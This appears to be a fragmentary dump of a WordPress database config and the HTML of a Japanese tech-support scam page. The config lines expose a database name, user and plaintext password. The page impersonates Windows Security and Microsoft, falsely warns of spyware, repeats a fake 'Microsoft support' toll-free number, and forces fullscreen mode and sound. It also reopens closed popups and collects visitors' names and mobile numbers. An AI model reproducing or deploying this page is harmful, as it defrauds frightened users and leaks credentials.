...
define( 'DB_NAME', 'sakshidoor' );

/** Database username */
define( 'DB_USER', 'sakshidoor' );

/** Database password */
define( 'DB_PASSWORD', 'eul5xucLqs7V' );
...
<body id="mycanvas" onclick="playSound()" style="overflow:hidden;">
  <div id="overlay"
    onclick="$('#overlay2').css('display', 'block'); setTimeout(function() { $('#overlay2').css('display', 'none');}, 5000);">
  ...
  <iframe src="https://support.microsoft.com/ja-jp" id="frame"
  ...
  <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
    <div class="black" style="height: 145%; cursor: default;"></div>
  </a>

  <div class="box" id="box">
    <div class="top">
      <p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows セキュリティ<img src="minimize.jpeg"
          class="" style="float: right; width:115px;"></p>
    </div>

    <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">ひと目でわかる安全性</h4>
    <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">
      <br>デバイスの安全性と健康状態に何が起こっているかを確認し、必要なすべての措置を講じてください。
    </p>
    <div class="centerright">
      <ul>
        <li>
          ...
          <p>ウイルスと脅威に対する保護</p>
          <p style="top: 103px; position: absolute; font-size: 13px; color: grey;">アクションが必要です。 スキャンを実行して<br>脅威をチェックします。
          </p>
  ...
  <div class="scan" id="scan" style="visibility: hidden;"></div>
  ...
  <div class="alert_popup cardcontainer lightbox" style="display: block;width: 60vw;left: 20vw; cursor: default;">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
...
margin-top: 8px; text-align: center;">Windows セキュリティ - スパイウェアの警告</p>
          ...
          <p style="padding-bottom: 0px;">Windows サポートに電話する
            <br><strong style="font-size: 20px;"> 0101-800-820-0106 (日本フリーダイヤル)</strong>
          </p>
          <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">わかった</a> <a class=""
              id="leave_page">キャンセルします</a> </div>
        </div>
...
">
    <h5 style="
">マイクロソフトサポート</h5><img src="support.png" style="
    height: 30px;
">
    <h5 style="
    font-weight: bold;
">0101-800-820-0106</h5>
  </div>
  <div class="border-secondary" id="userform" onkeypress="function(e) {alert(e.keyName());}" style="padding: 10px;left: 5px;top: 36vh;height: auto;position: fixed;background: white;border: 1px solid;cursor: default;z-index: 9999;border-radius: 10px;">
    <div class="" style="max-width: 220px;background-colorx: #0275D6;">
      ...
      <div class="form-group">
        ...
        <input id="nameinput" type="Name" class="form-control" placeholder="名前を入力">
      </div>
      <div class="form-group">
        <label for="Mobile">モバイル:</label>
        <input id="mobileinput" type="tel" class="form-control" placeholder="モバイルへの参入">
      </div>
  ...
  <div id="lst" class="lst lightbox">
    <div class="ilb top">
      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
        <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span>
          WindowsDefenderセキュリティセンター</span>
        <span id="txts1" class="fl title2"
          onclick="$('#lst').css('display', 'none'); window.setTimeout(function() { $('#lst').css('display', 'block'); }, 30000);"><a
            href="#"><img src="cross.png"></a></span>
    ...
    <div id="disclaimer">
      ...
      <span class="support">Windowsサポートに連絡する:
        <script>document.write(phone)</script> 0101-800-820-0106 (通話料無料)
      </span>
    </div>
    <div id="bottom">
        ...
        <li>
          <a href="#">
            <div class="fr button2"
              onclick="$('#lst').css('display', 'none'); window.setTimeout(function() { $('#lst').css('display', 'block'); }, 30000);">
  ...
  <div id="footer" style="bottom: 0; position: absolute; cursor: none;width: auto;overflow: hidden; background: red;">
    <div class="row">

      <div class="col-md-12">
        <div class="right-foot" style="text-align: center;">
          <span id="footertxt"><img src="microsoft.png"> マイクロソフト: </span><span
            style="font-weight: 700;padding-left: 13px;color: #fff;">サポート問い合わせ先 <span
              style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">
              <script>document.write(phone)</script> 0101-800-820-0106 (通話料無料)
            </span></span>
        </div>
      </div>
      <div class="col-md-12">
        <marquee width="100%" direction="left" height="100px"><small class="text-left"
            style="color: #eee;font-size: 10px;">ウィンドウズ
  ...
  <div id="welcomeDiv" style=" display:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
     margin-top: -8px; " class="answer_list">
        ...
        <div class="modal-body">
          <div class="row">
            ...
            <div class="col-12 col-md-7 text-left">
              <div id="modal-title" class="modal-title text-center modal-title-1">安全警告を止める このページを閉じないでください
                今すぐお電話ください0101-800-820-0106 <br>
                <script>document.write(phone)</script>
              </div>
              <div class="">
